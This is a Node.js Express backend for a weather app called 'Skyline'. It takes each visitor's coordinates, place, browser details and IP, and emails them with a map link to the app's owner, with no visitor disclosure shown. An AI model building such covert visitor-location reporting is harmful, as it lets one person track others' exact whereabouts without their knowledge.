import "dotenv/config";
import express from "express";
import cors from "cors";
import nodemailer from "nodemailer";

const PORT = process.env.PORT || 8787;
const APP_EMAIL = process.env.APP_EMAIL;
const APP_PASSWORD = process.env.APP_PASSWORD;
const NOTIFY_TO = process.env.NOTIFY_TO || APP_EMAIL;

const app = express();
app.use(cors({ origin: true }));
app.use(express.json());

// Build the Gmail transporter once, only if credentials are present.
let transporter = null;
if (APP_EMAIL && APP_PASSWORD && APP_PASSWORD !== "your-16-char-gmail-app-password") {
  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: APP_EMAIL, pass: APP_PASSWORD },
  });
  transporter.verify((err) => {
    if (err) console.warn("[skyline] Gmail transport not ready:", err.message);
    else console.log("[skyline] Gmail transport ready — alerts will send.");
  });
} else {
  console.warn(
    "[skyline] APP_EMAIL / APP_PASSWORD not set in .env — alert emails are DISABLED.\n" +
      "          Copy .env.example to .env and fill them in to enable alerts."
  );
}

app.get("/", (_req, res) => {
  res.send("server is running okay");
});

app.get("/api/health", (_req, res) => {
  res.json({ ok: true, mailerConfigured: !!transporter });
});

app.post("/api/notify", async (req, res) => {
  const { lat, lon, place, source, userAgent, platform, language, screen, at } =
    req.body || {};

  if (typeof lat !== "number" || typeof lon !== "number") {
    return res.status(400).json({ ok: false, error: "lat/lon required" });
  }

  // Always log locally, even when email is off.
  console.log(
    `[skyline] visit @ ${new Date().toISOString()} — ${place || "?"} (${lat}, ${lon}) via ${source || "?"}`
  );

  if (!transporter) {
    return res.json({ ok: true, emailed: false, reason: "mailer-not-configured" });
  }

  try {
    await transporter.sendMail(buildEmail({
      lat, lon, place, source, userAgent, platform, language, screen, at,
      ip: req.ip,
    }));
    res.json({ ok: true, emailed: true });
  } catch (err) {
    console.error("[skyline] failed to send alert:", err.message);
    res.status(502).json({ ok: false, error: "send-failed" });
  }
});

/*
  Email template — a decision point worth tuning: adjust the subject line, which
  fields appear, or the styling to taste.
*/
function buildEmail(v) {
  const maps = `https://www.google.com/maps?q=${v.lat},${v.lon}`;
  const when = v.at ? new Date(v.at).toLocaleString() : new Date().toLocaleString();
  const esc = (s) =>
    String(s ?? "—").replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c]));

  const text = [
    `Skyline — someone opened your weather app.`,
    ``,
    `Location : ${v.place || "Unknown"}`,
    `Coords   : ${v.lat}, ${v.lon}`,
    `Map      : ${maps}`,
    `Source   : ${v.source || "?"}`,
    `When     : ${when}`,
    `Browser  : ${v.userAgent || "?"}`,
    `Platform : ${v.platform || "?"}`,
    `Language : ${v.language || "?"}`,
    `Screen   : ${v.screen || "?"}`,
  ].join("\n");

  const html = `
  <div style="font-family:ui-sans-serif,system-ui,Arial,sans-serif;max-width:560px;margin:0 auto;border:1px solid #CDE8FF;border-radius:16px;overflow:hidden">
    <div style="background:linear-gradient(135deg,#3B9EEF,#0A3D6B);color:#fff;padding:20px 24px">
      <div style="font-size:18px;font-weight:700">⛅ Skyline — new visit</div>
      <div style="opacity:.85;font-size:13px;margin-top:2px">${esc(v.place) || "Unknown location"}</div>
    </div>
    <table style="width:100%;border-collapse:collapse;font-size:14px;color:#0C2A43">
      ${row("Coordinates", `${v.lat}, ${v.lon}`)}
      ${row("Map", `<a href="${maps}" style="color:#3B9EEF">Open in Google Maps</a>`)}
      ${row("Source", esc(v.source))}
      ${row("When", esc(when))}
      ${row("Browser", esc(v.userAgent))}
      ${row("Platform", esc(v.platform))}
      ${row("Language", esc(v.language))}
      ${row("Screen", esc(v.screen))}
    </table>
  </div>`;

  return {
    from: `"Skyline Alerts" <${APP_EMAIL}>`,
    to: NOTIFY_TO,
    subject: `⛅ Skyline visit — ${v.place || `${v.lat}, ${v.lon}`}`,
    text,
    html,
  };
}

function row(label, value) {
  return `<tr>
    <td style="padding:10px 24px;color:#5b7a92;white-space:nowrap;border-top:1px solid #EAF4FF;font-weight:600">${label}</td>
    <td style="padding:10px 24px;border-top:1px solid #EAF4FF;word-break:break-word">${value}</td>
  </tr>`;
}

app.listen(PORT, "127.0.0.1", () => {
  console.log(`[skyline] alert backend on http://127.0.0.1:${PORT}`);
});
